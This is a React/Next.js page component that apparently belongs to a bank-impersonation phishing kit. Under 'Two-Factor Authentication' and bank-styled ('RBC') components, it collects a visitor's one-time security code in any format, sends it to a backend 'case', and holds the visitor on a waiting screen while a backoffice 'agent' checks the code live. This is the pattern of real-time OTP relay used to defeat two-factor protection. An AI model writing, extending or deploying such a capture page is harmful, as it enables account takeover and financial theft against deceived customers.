'use client';

/**
 * Secret Key / OTP Stage Page
 *
 * Customer enters their one-time password or secret code
 * Minimal validation - accepts any format
 * Agent verifies in backoffice
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCInput, RBCButton, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { AlertCircle } from 'lucide-react';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form field and show error
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false); // Reset loading state
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      // Validate case ID is available
      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      // Minimal validation - just check required
      if (!secretKey.trim()) {
        setFieldError('Please enter your secret code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your secret code...',
          formData: {},
        });
        // Don't set isSubmitting to false - keep waiting state until agent responds
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        <div className="mb-[40px] pb-[15px] border-b border-border">
          <h1 className="text-[18px] md:text-[20px] text-foreground font-normal m-0">
            Two-Factor Authentication
          </h1>
        </div>

        {isSubmitting ? (
          <RBCWaitingState
            message="Verifying your code..."
            steps={VERIFICATION_STEPS.secretKey}
          />
        ) : (
          <form onSubmit={handleSubmit} className="w-full mb-5 flex flex-col" noValidate>
            <div className="mb-[20px]">
              <p className="text-[#555] text-[13px] font-normal leading-snug">
                A one-time security code has been sent to you. Please enter it below.
              </p>
            </div>

            <RBCInput
              id="secretKey"
              name="secretKey"
              type="text"
              label="Security Code"
              placeholder=""
              value={secretKey}
              onChange={(e) => {
                setSecretKey(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isSubmitting || loading}
              autoComplete="off"
              required
            />

            {/* Field-level error */}
            {fieldError && (
              <div className="flex items-center gap-2 text-sm text-destructive mb-4">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            {/* API-level error */}
            {error && !fieldError && (
              <div className="flex items-start gap-3 p-3 bg-red-50 rounded-md border border-red-200 mb-4">
                <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-sm text-destructive">{error}</p>
              </div>
            )}

            <div className="my-[10px]">
              <RBCButton type="submit" disabled={!secretKey.trim() || isSubmitting || loading}>
                {isSubmitting ? 'Processing...' : 'Next'}
              </RBCButton>
            </div>

            <div className="flex items-center gap-[10px] mt-[5px]">
              <a href="#" className="text-accent no-underline text-[13px] transition-colors hover:underline">
                Don't know the answer?
              </a>
            </div>
          </form>
        )}
      </div>
    </SplitLayout>
  );
}
